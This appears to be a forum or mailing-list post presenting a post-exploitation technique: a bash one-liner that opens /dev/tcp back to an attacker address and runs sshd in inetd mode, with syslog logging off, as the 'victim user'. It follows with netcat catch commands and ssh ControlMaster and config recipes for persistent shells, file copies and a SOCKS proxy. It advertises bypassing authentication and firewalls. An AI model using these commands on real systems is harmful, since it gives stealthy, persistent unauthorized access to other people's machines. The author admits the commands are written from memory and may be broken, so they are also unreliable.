@@ -1,0 +1,94 @@
+Hi all,
+
+I was looking for ways to upgrade simple TCP shells on the weekend and came up with the following way to send an ssh server back to yourself. I couldn't find any references to this technique. It might be new.
+
+configdir=$(mktemp -d); echo "blahblahauthorizedkey" >>"$configdir/a"; ssh-keygen -t rsa -b 2048 -f "$configdir/k"; /bin/bash -c "exec 3<>/dev/tcp/address/port; /usr/bin/sshd -iq -o 'AuthenticationMethods=publickey' -o 'AuthorizedKeysCommand=/usr/bin/cat $configdir/a' -o 'AuthorizedKeysCommandUser=$USER' -h '$configdir/k' 0<&3 1>&3 2>&3"
+
+The specific details of this command can be adapted to suit your needs.
+
+Note that all of the commands in this writeup are reproduced from memory. Some will probably be broken. Let me know if you have any issues, but read the manpages and experiment (ssh(3), ssh_config(3), sshd(3), sshd_config(3)).
+
+Benefits
+•	Bypasses authentication requirements
+•	Bypasses firewalling blocking ssh without needing to run an improvised tunnel to the internal ssh port
+•	You don't have to edit the user's authorized_keys file
+•	You can enable features that might not be enabled on the system ssh daemon; e.g., GatewayPorts
+•	You can still get ssh if sshd is installed but not running
+How it works
+
+As a refresher, inetd is a server that can handle the networking part of running servers. It runs listeners and creates subprocesses to handle incoming connections. Its creation was partially motivated so network services could be stopped when there weren't any connections to handle, to save resources. 
+
+inetd servers communicate with inetd using standard streams rather than over a socket. sshd includes support for running under inetd with the -i switch. When sshd is run in this mode, it serves a single connection over stdin and stdout.
+
+This shell uses this feature to create an sshd process running as the victim user that can bind to a reverse connection.
+
+The following switches are used in my example above:
+
+-i: run in inetd mode
+-q: do not log to syslog
+-o: set some ssh settings so we can authenticate; you can't completely disable authentication
+-h: set the host key
+
+Using the shell
+
+The simplest way is to catch the connection with netcat and get a shell with whatever switches you set:
+
+ssh -D -o "ProxyCommand=nc -nlp $port" user@blah
+
+I think user has to be the username of the victim user, didn't test.
+
+Doing it this way is wasteful. ssh can multiplex its various features through single TCP connections. This ordinarily happens through each invocation of ssh.
+
+To better leverage this feature, ssh has a feature for sharing multiple invocations of ssh through one TCP session. People most often use this for speeding up ssh over connections with high latency, as authentication only needs to happen once. We can instead leverage this feature to make the most use of the reverse shell and establish a persistent connection we can re-use for shells, file copies, port mapping, and the SOCKS proxy.
+
+mkdir ~/.ssh/control_sockets/
+ssh -o "ControlMaster: yes" -o "ControlPath=~/.ssh/control_sockets/%h" -o "ControlPersist=yes" -o "ProxyCommand=nc -nlp $port" -fNT user@blah
+
+-M and -S can probably be substituted for ControlMaster and ControlPath.
+
+The "%h" in the ControlPath spec will expand to the hostname used for the connection (blah). You can find other format parameters in the TOKENS section of ssh_config(3).
+
+I'm not sure if -T will prevent other processes sharing the socket from allocating pseudoterminals; you'll have to try this yourself.
+
+You can use the control master as normal. For example, to get a shell:
+
+ssh  -S "~/.ssh/control_sockets/%h" user@blah
+
+To run a backgrounded SOCKS proxy:
+
+ssh -fNTDS "~/.ssh/control_sockets/%h" user@blah
+
+To shut down the connection, send the control socket an exit command:
+
+ssh -S "~/.ssh/control_sockets/%h" -O exit user@blah
+
+By default, you can have up to 10 channels running over a single ssh connection. This limit can be configured on the sshd end, but the more channels you load onto the connection, the more performance will degrade. You may experience failures if you are too aggressive.
+
+Streamlining things
+
+Rather than typing all this out, you could all the boilerplate in your ssh_config:
+
+#
+# ~/.ssh/config
+
+Host blah-master
+    ControlMaster yes
+    ControlPath ~/.ssh/control_sockets/blah
+    ControlPersist yes
+    # Can't hurt to have a SOCKS proxy from the get-go
+    DynamicForward 127.0.0.1:1338
+    IdentityFile ~/.ssh/id_victim_key
+    User user
+    ProxyCommand nc -nlp 1337
+    RemoteCommand none
+    RequestTTY no
+
+Host blah
+    User user
+    ControlPath ~/.ssh/control_sockets/blah
+
+You can use more advanced Host and Match specifications to save some duplicated directives.
+
+Enjoy,
+
+Shaun
